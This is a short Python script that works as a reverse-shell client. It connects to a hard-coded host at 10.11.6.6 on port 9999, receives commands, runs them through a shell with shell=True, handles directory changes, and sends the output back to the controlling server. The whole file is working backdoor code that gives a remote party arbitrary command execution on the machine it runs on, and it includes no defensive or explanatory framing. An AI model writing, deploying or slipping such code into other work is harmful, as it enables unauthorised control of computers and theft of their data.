'''
    BASIC FUNCIONALITY
    --> TRY AND CONNECT TO SERVER
        --> WAIT FOR INSTRUCTIONS FROM SERVER
            --> EXECUTE INSTRUCTIONS
                --> SEND RESULT TO SERVER
'''

import socket, os, subprocess, sys


s = socket.socket()
host = "10.11.6.6"
port = 9999

s.connect((host, port))
while True:
    try:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
            s.send(str.encode(os.getcwd() + ">"))
        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            current_dir = os.getcwd() + ">"
            s.send(str.encode(output_str + current_dir))
        elif len(data) <= 0:
            sys.exit()
    except BaseException as e:
        s.send(str.encode(str(e)))

